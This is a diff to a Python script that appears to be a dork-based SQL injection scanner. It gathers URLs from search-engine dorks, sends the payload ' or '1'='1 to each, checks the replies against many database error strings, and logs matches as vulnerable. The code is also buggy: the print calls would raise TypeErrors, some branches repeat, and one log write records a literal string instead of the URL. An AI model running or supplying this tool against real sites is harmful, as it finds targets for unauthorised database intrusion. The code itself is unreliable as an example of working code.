@@ -100,7 +100,7 @@ def search(maxc):
         dark = 0
         for dork in go:  # load dorks selected earlier to run checks with
             dark += 1
-            page = 0 #
+            page = 0  #
             try:
                 while page < int(maxc):
                     try:  # build urllib request for search engine and the dork in question
@@ -191,19 +191,96 @@ class Injthread(threading.Thread):
         self.check = False
 
 
-
 def classicinj(url):
     fullurl = (url)
     resp = urllib.request.urlopen(fullurl + "=\' or \'1\' = \'1'")
     body = resp.read()
     host = body.decode('utf-8')
     try:
-        if "an error in your SQL syntax" in host:
-            print (host) + " is vulnerable"
+        if str("an error in your SQL syntax") in host:
+            print(url) + " is vulnerable --> MySQL Classic"
+            logfile.write("\n" + url)
         elif "mysql_fetch" in host:
-            print (host) + " is Vulnerable"
-        elif "num_rows"  in host:
-            print (host) + " is Vulnerable"
+            print(url) + " is Vulnerable --> MiscError"
+            logfile.write("\n" + url)
+        elif "num_rows" in host:
+            print(url) + " is Vulnerable --> MiscError2"
+            logfile.write("\n" + url)
+        elif "ORA-01756" in host:
+            print(url) + " is Vulnerable --> Oracle"
+            logfile.write("\n" + url)
+        elif "Error Executing Database Query" in host:
+            print(url) + " is Vulnerable --> JDBC_CFM"
+            logfile.write("\n" + url)
+        elif "SQLServer JDBC Driver" in host:
+            print(url) + " is Vulnerable --> JDBC_CFM2"
+            logfile.write("\n" + url)
+        elif "OLE DB Provider for SQL Server" in host:
+            print(url) + " is Vulnerable --> MSSQL_OLEdb"
+            logfile.write("\n" + url)
+        elif "Unclosed quotation mark" in host:
+            print(url) + " is Vulnerabe --> MSSQL_Uqm"
+            logfile.write("\n" + url)
+        elif "ODBC Microsoft Access Driver" in host:
+            print(url) + " is Vulnerable --> MS-Access_ODBC"
+            logfile.write("\n" + url)
+        elif "Microsoft JET Database" in host:
+            print(url) + " is Vulnerable --> MS-Access_JETdb"
+            logfile.write("\n" + url)
+        elif "Error Occurred While Processing Request" in host:
+            print(url) + " is Vulnerabe --> Processing Request"
+            logfile.write("\n" + url)
+        elif "Microsoft JET Database" in host:
+            print(url) + " is Vulnerable --> MS-Access JetDb"
+            logfile.write("\n" + url)
+        elif "Error Occurred While Processing Request" in host:
+            print(url) + " is Vulnerable --> Processing Request "
+            logfile.write("\n" + url)
+        elif "Server Error" in host:
+            print(url) + " is Vulnerable --> Server Error"
+            logfile.write("\n" + url)
+        elif "ODBC Drivers error" in host:
+            print(url) + " is Vulnerable --> ODBC Drivers error"
+            logfile.write("\n" + url)
+        elif "Invalid Querystring" in host:
+            print(url) + " is Vulnerable --> Invalid Querystring"
+            logfile.write("\n" + url)
+        elif "OLE DB Provider for ODBC" in host:
+            print(url) + " is Vulnerable --> OLE DB Provider for ODBC"
+            logfile.write("\n" + url)
+        elif "VBScript Runtime" in host:
+            print(url) + " is Vulnerable --> VBScript Runtime"
+            logfile.write("\n" + url)
+        elif "ADODB.Field" in host:
+            print(url) + " is Vulnerable --> ADODB.Field"
+            logfile.write("\n" + url)
+        elif "BOF or EOF" in host:
+            print(url) + " is Vulnerable --> BOF or EOF"
+            logfile.write("\n" + url)
+        elif "ADODB.Command" in host:
+            print(url) + " is Vulnerable --> ADODB.Command"
+            logfile.write("\n + url")
+        elif "JET Database" in host:
+            print(url) + " is Vulnerable --> JET Database"
+            logfile.write("\n" + url)
+        elif "mysql_fetch_array" in host:
+            print(url) + " is Vulnerabe --> mysql_fetch_array"
+            logfile.write("\n" + url)
+        elif "Syntax error" in host:
+            print(url) + " is Vulnerable --> Syntax error"
+            logfile.write("\n" + url)
+        elif "mysql_numrows()" in host:
+            print(url) + " is Vulnerable --> mysql_numrows()"
+            logfile.write("\n" + url)
+        elif "GetArray()" in host:
+            print(url) + " is Vulnerable --> GetArray()"
+            logfile.write("\n" + url)
+        elif "FetchRow()" in host:
+            print(url) + " is Vulnerable --> FetchRow()"
+            logfile.write("\n" + url)
+        elif "Input string was not in a correct format" in host:
+            print(url) + " is Vulnerable --> Input String Error"
+            logfile.write("\n" + url)
         else:
             pass
     except:
